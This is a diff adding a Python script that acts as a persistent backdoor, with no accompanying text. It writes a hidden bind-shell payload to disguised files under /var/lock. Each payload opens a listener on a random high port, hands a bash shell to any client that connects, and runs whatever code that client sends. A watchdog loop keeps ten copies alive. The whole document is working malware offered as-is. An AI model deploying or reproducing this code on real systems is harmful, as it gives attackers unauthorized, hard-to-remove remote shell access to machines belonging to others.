@@ -1,0 +1,51 @@
+#!/usr/bin/python3
+import os, subprocess, socket, sys, time
+from random import randint
+
+s = \
+"""
+#!/usr/bin/python3
+import socket as a
+import os
+from random import randint
+while True:
+        s = a.socket()
+        pnum = randint(60000,65000)
+        s.bind(('0.0.0.0',pnum))
+        s.listen(1)
+        (r,z) = s.accept()
+        exec('import pty,os;os.dup2(r.fileno(),0);os.dup2(r.fileno(),1);os.dup2(r.fileno(),2);pty.spawn("/bin/bash");s.close()')                                               
+        exec(r.recv(999))
+"""
+procs = []
+maxNumProcs = 10
+# WRITE OUT SHELL
+def writeShell():
+	fname = str(randint(11111111111111,99999999999999))
+	fname = "/var/lock/.sys-" + fname
+	with open(fname, "w") as f:
+		f.write(s)
+	os.system("chmod +x " + fname)
+	return fname
+
+# START NEW PROCESS
+def startProc():
+	fname = writeShell()
+	proc = subprocess.Popen(['python3', fname])
+	procs.append(proc)
+	print("starting proc")
+
+# CHECK RUNNING
+def checkRunning():
+	for p in range(0, len(procs)-1):
+		if procs[p].poll() is not None:
+			del procs[p]
+	while (len(procs) < maxNumProcs):
+		startProc()
+
+# LOOP
+while True:
+	time.sleep(10)
+	checkRunning()
+
+
